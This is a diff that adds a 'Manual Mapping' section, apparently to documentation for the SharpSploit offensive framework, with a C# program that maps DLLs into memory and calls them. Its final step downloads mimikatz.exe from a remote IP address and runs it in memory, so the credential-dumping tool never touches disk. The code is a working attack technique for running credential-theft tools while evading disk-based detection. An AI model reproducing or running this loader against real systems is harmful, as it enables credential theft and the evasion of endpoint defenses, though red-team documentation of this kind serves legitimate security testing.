@@ -1,3 +1,68 @@
+## Manual Mapping
+
+```csharp
+
+using System;
+using System.Runtime.InteropServices;
+
+namespace MapTest
+{
+    class Program
+    {
+        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+        public delegate int MessageBox(IntPtr hWnd, String text, String caption, int options);
+
+        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+        public delegate int TestFunc();
+
+        static void Main(string[] args)
+        {
+            //Test DLL project can be found at: https://github.com/FuzzySecurity/DLL-Template
+
+            Console.WriteLine("[+] Mapping Test DLL from disk into memory!");
+
+            Console.WriteLine("\t[+] Calling Test DLL from memory by DLLMain...\n");
+            // (1) Call test DLL by DLLMain
+            SharpSploit.Execution.PE.PE_MANUAL_MAP ManMapTest = SharpSploit.Execution.DynamicInvoke.Generic.MapModuleToMemory(@"C:\Users\thewover.CYBERCYBER\Source\Repos\ManualMapTest\ManualMapTest\Dll-Template.dll");
+            SharpSploit.Execution.DynamicInvoke.Generic.CallMappedDLLModule(ManMapTest.PEINFO, ManMapTest.ModuleBase);
+
+            Console.WriteLine();
+            Console.WriteLine("\t[+] Calling Test DLL from memory by export (also calls DllMain as part of init)!\n");
+
+            // (2) Call test DLL by export (Also calls DllMain as part of init)
+            SharpSploit.Execution.PE.PE_MANUAL_MAP ManMapTest2 = SharpSploit.Execution.DynamicInvoke.Generic.MapModuleToMemory(@"C:\Users\thewover.CYBERCYBER\Source\Repos\ManualMapTest\ManualMapTest\Dll-Template.dll");
+            object[] FunctionArgs = { };
+            SharpSploit.Execution.DynamicInvoke.Generic.CallMappedDLLModuleExport(ManMapTest2.PEINFO, ManMapTest2.ModuleBase, "test", typeof(TestFunc), FunctionArgs);
+
+            Console.WriteLine();
+            Console.WriteLine("[+] Mapping Test DLL from byte array and calling export!\n");
+
+            Console.WriteLine();
+            Console.WriteLine("\t[+] Calling Test DLL from memory by export (also calls DllMain as part of init)!\n");
+
+            // (3) Map test DLL using byte array. Call by export like above.
+            byte[] bytes = System.IO.File.ReadAllBytes(@"C:\Users\thewover.CYBERCYBER\Source\Repos\ManualMapTest\ManualMapTest\Dll-Template.dll");
+            SharpSploit.Execution.PE.PE_MANUAL_MAP ManMapTest3 = SharpSploit.Execution.DynamicInvoke.Generic.MapModuleToMemory(bytes);
+            SharpSploit.Execution.DynamicInvoke.Generic.CallMappedDLLModuleExport(ManMapTest3.PEINFO, ManMapTest3.ModuleBase, "test", typeof(TestFunc), FunctionArgs);
+
+            Console.WriteLine();
+            Console.WriteLine("[+] Mapping and calling Mimikatz from memory (via download from URL)!\n");
+
+            Console.WriteLine();
+            Console.WriteLine("\t[+] Calling Mimikatz EXE from memory!\n");
+
+            // (4) Mimikatz x64
+            byte[] katzBytes = new System.Net.WebClient().DownloadData(@"http://192.168.123.227:8000/mimikatz.exe");
+            SharpSploit.Execution.PE.PE_MANUAL_MAP ManMapKatz = SharpSploit.Execution.DynamicInvoke.Generic.MapModuleToMemory(katzBytes);
+            SharpSploit.Execution.DynamicInvoke.Generic.CallMappedPEModule(ManMapKatz.PEINFO, ManMapKatz.ModuleBase);
+
+            Console.ReadLine();
+        }
+    }
+}     
+
+```
+
 ## Module Overloading
 
 ```csharp
